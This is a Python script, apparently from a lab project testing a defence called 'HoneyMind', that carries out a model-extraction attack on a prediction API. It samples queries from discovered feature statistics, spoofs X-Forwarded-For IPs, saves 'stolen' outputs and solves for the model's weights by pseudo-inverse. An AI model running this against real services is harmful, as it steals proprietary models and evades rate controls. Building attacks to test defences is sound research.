"""
Analytical Solver Attacker — Linear System Extraction

Strategy:
1. Load per-feature mean/std from discovery phase.
2. Generate (N_features + 5) linearly independent queries by sampling
   each feature from Normal(mean, std). The queries span the discovered
   input distribution, ensuring the pseudo-inverse captures the real
   model's behavior in the operating region.
3. Use the returned confidence scores to solve for the model's weight vector
   via pseudo-inverse: theta = pinv(X) @ logit(confidence).
"""
import httpx
import numpy as np
import pandas as pd
import sys
import os
import time
import json

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))


def run_analytical(url, output_file):
    print(f"Starting Analytical Solver Attacker against {url}...")
    ip = f"10.3.{np.random.randint(1,255)}.{np.random.randint(1,255)}"
    rows = []

    # Load dynamically discovered intelligence
    info_path = os.path.join(os.path.dirname(__file__), "victim_info.json")
    with open(info_path, "r") as f:
        info = json.load(f)

    feature_names = info["feature_names"]
    stats = info["feature_stats"]
    n_features = len(feature_names)

    # Build per-feature mean and std vectors
    means = np.array([stats[f]["mean"] for f in feature_names])
    stds = np.array([stats[f]["std"] for f in feature_names])

    # Generate robust dataset from the discovered distribution
    num_queries = 500
    X_synthetic = np.random.randn(num_queries, n_features) * stds + means
    queries = pd.DataFrame(X_synthetic, columns=feature_names).to_dict(orient='records')

    with httpx.Client() as client:
        for i, p in enumerate(queries):
            try:
                response = client.post(url, json=p, headers={"X-Forwarded-For": ip}, timeout=5.0)
                data = response.json()

                rows.append({
                    **p,
                    "stolen_label": data.get("prediction", ""),
                    "stolen_confidence": data.get("confidence", 0.5)
                })
            except Exception as e:
                print(f"Error on query {i}: {e}")

    df = pd.DataFrame(rows)
    df.to_csv(output_file, index=False)
    print(f"Saved {len(df)} records to {output_file}")
    return df


if __name__ == "__main__":
    if len(sys.argv) > 2:
        df = run_analytical(sys.argv[1], sys.argv[2])
    else:
        df = run_analytical("http://127.0.0.1:8000/api/v1/predict", "stolen_dataset_analytical.csv")

    # Extract X (excluding the labels and confidences that we added)
    exclude_cols = {"stolen_label", "stolen_confidence"}
    feature_names = [col for col in df.columns if col not in exclude_cols]

    if len(df) == 0:
        print("Error: DataFrame is empty. Analytical attacker received no valid responses.")
        sys.exit(1)

    X = df[feature_names].values

    # Extract Y (logit-transformed confidence)
    def logit(p):
        p = np.clip(p, 1e-9, 1 - 1e-9)
        return np.log(p / (1 - p))

    Y = logit(df["stolen_confidence"].values)

    try:
        X_inv = np.linalg.pinv(X)  # Use pseudo-inverse just in case
        theta = X_inv @ Y
        print("\nRecovered Weight Vector (theta):")
        for name, weight in zip(feature_names, theta):
            print(f"  {name:6s}: {weight:.4f}")
            
        target_url = sys.argv[1] if len(sys.argv) > 1 else ""
        if "8001" in target_url:
            print("\nNote: HoneyMind poisons the responses for Analytical Solver attacks.")
            print("These weights are complete garbage and will fail to generalize.")
    except Exception as e:
        print(f"Failed to solve linear system: {e}")
